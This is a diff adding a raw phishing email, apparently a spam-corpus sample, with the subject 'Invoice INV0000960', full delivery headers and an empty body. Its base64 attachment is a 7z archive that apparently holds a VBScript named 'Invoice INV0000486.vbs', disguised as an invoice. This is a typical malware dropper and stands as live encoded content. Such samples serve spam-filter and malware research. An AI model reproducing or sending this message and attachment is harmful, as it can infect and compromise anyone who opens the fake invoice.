@@ -1,0 +1,124 @@
+Return-Path: <valarie@kontkowski.com>
+Delivered-To: iwo@pages.at
+Received: from infinity.pages.at ([127.0.0.1])
+	by virtual-inn (Dovecot) with LMTP id Dug8AKFr3VmaJgAAL9XaFg
+	for <iwo@pages.at>; Wed, 11 Oct 2017 02:53:53 +0200
+Received: from localhost (localhost [127.0.0.1])
+	by infinity.pages.at (Postfix) with ESMTP id E91111B01E2
+	for <jr@pages.at>; Wed, 11 Oct 2017 02:53:52 +0200 (CEST)
+X-Virus-Scanned: Debian amavisd-new at pages.at
+X-Spam-Flag: NO
+X-Spam-Score: 1.479
+X-Spam-Level: *
+X-Spam-Status: No, score=1.479 tagged_above=-9999 required=6.31
+	tests=[BAYES_00=-1.9, RCVD_IN_MSPIKE_BL=0.01, RCVD_IN_MSPIKE_L5=2.566,
+	RDNS_NONE=0.793, T_SPF_TEMPERROR=0.01] autolearn=no autolearn_force=no
+Received: from infinity.pages.at ([127.0.0.1])
+	by localhost (infinity.pages.at [127.0.0.1]) (amavisd-new, port 10024)
+	with ESMTP id LEjNANZbProZ for <jr@pages.at>;
+	Wed, 11 Oct 2017 02:53:42 +0200 (CEST)
+Received-SPF: Temperror (SPF Temporary Error: DNS No working name servers discovered) identity=mailfrom; client-ip=39.40.160.56; helo=[39.40.160.56]; envelope-from=valarie@kontkowski.com; receiver=jr@pages.at 
+Received: from [39.40.160.56] (unknown [39.40.160.56])
+	by infinity.pages.at (Postfix) with ESMTP id 6D9851AFE82
+	for <jr@pages.at>; Wed, 11 Oct 2017 02:53:38 +0200 (CEST)
+Content-Type: multipart/mixed;
+	boundary="Apple-Mail-9D5AE4F2-52AE-B6E5-D899-8489732AA98A"
+Content-Transfer-Encoding: 7bit
+From: Valarie Boutflower <valarie@kontkowski.com>
+Date: Wed, 11 Oct 2017 05:53:24 +0500
+Subject: Invoice INV0000960
+Message-ID: <A9C2CB01-C7BD-CA4D-056C-6F11F2AF9A29@kontkowski.com>
+To: <jr@pages.at>
+X-Mailer: iPhone Mail (14D27)
+MIME-Version: 1.0
+
+--Apple-Mail-9D5AE4F2-52AE-B6E5-D899-8489732AA98A
+Content-Type: text/plain; charset="us-ascii"
+Content-Transfer-Encoding: 7bit
+
+
+
+--Apple-Mail-9D5AE4F2-52AE-B6E5-D899-8489732AA98A
+Content-Type: application/octet-stream; name="Invoice INV0000960.7z";
+	x-apple-part-url=1843C25C-EC06-EF35-D430-86598635B8F5
+Content-Disposition: attachment; filename="Invoice INV0000960.7z"
+Content-Transfer-Encoding: base64
+
+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
+
+--Apple-Mail-9D5AE4F2-52AE-B6E5-D899-8489732AA98A
+Content-Type: text/plain; charset="us-ascii"
+Content-Transfer-Encoding: 7bit
+
+
+
+
+Sent from my iPhone
+--Apple-Mail-9D5AE4F2-52AE-B6E5-D899-8489732AA98A--
